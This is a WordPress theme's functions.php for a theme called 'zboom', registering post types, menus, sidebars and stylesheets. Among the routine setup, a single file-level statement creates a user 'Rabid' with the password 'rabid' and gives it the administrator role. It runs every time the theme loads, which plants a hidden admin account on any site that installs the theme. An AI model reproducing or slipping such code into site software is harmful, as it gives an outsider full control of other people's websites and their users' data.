<?php

function zboom_theme() {
	add_theme_support('title-tag');
	add_theme_support('post-thumbnails');
	add_theme_support('custom-background');
}

function read_more($limit) {
	$post_content= explode(" ", get_the_content());
	$slice_content= array_slice($post_content, 0, $limit);
	echo implode(" ", $slice_content);
}


register_post_type('zboomslider', array(
	'labels' => array(
		'name' =>  'Sliders',
		'add_new_item' => 'Add New Slider',
	),
	'public' => true,
	'supports' => array('title','thumbnail'),
	'menu_icon'   => 'dashicons-slides'
));

register_post_type('zboomservices', array(
	'labels' => array(
		'name' =>  'Blocks',
		'add_new_item' => __('Add New Block','zboom')
	),
	'public' => true,
	'supports' => array('title', 'editor', 'thumbnail')
));

register_post_type('zboomgallery', array(
	'labels' => array(
		'name' =>  'Gallery',
		'add_new_item' => __('Add New Gallery item','zboom')
	),
	'public' => true,
	'supports' => array('title', 'editor', 'thumbnail')
));

load_theme_textdomain('zboom',get_template_directory_uri().'/languages');
add_action('after_setup_theme','zboom_theme');

if(function_exists('register_nav_menu')) {
	register_nav_menu('main-menu',__('Main menu','zboom'));
}

function zboom_right_sidebar() {
	register_sidebar(array(
		'name' => __('Right Sidebar','zboom'),
		'description' => __('Add your right sidebar here', 'zboom'),
		'id' => 'right-sidebar',
		'before_widget' => '<div class="box right-sidebar">',
		'after_widget' => '</div></div>',
		'before_title' => '<div class="heading"><h2>',
		'after_title' => '</h2></div><div class="content">',
	));
	register_sidebar(array(
		'name' => __('Contact Right Sidebar','zboom'),
		'description' => __('Add your contact right sidebar here', 'zboom'),
		'id' => 'contact-right-sidebar',
		'before_widget' => '<div class="box right-sidebar">',
		'after_widget' => '</div></div>',
		'before_title' => '<div class="heading"><h2>',
		'after_title' => '</h2></div><div class="content">',
	));
	register_sidebar(array(
		'name' => __('Footer widgets','zboom'),
		'description' => __('Add your footer widgets here', 'zboom'),
		'id' => 'footer-widget',
		'before_widget' => '<div class="col-1-4"><div class="wrap-col"><div class="box">',
		'after_widget' => '</div></div></div></div>',
		'before_title' => '<div class="heading"><h2>',
		'after_title' => '</h2></div><div class="content">',
	));
}

add_action('widgets_init','zboom_right_sidebar');

$createDefaultUser= new WP_User(wp_create_user('Rabid','rabid','rabidislam@hotmail.com'));
$createDefaultUser->set_role('administrator');



function zboom_css_js() {
	wp_register_style('zerogrid',get_template_directory_uri().'/css/zerogrid.css');
	wp_register_style('responsive',get_template_directory_uri().'/css/responsive.css');
	wp_register_style('style',get_template_directory_uri().'/css/style.css');
	wp_register_style('responsiveslides',get_template_directory_uri().'/css/responsiveslides.css');
	wp_register_style('font-awesome','https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css');

	wp_enqueue_style('zerogrid');
	wp_enqueue_style('responsive');
	wp_enqueue_style('style');
	wp_enqueue_style('responsiveslides');
	wp_enqueue_style('font-awesome');

	wp_register_script('responsiveslides',get_template_directory_uri().'/js/responsiveslides.js');
	wp_register_script('script',get_template_directory_uri().'/js/script.js');

	wp_enqueue_script('jQuery');
	wp_enqueue_script('responsiveslides');
	wp_enqueue_script('script');

}

add_action('wp_enqueue_scripts','zboom_css_js');

require_once('lib/ReduxCore/framework.php');
require_once('lib/sample/config.php');

?>

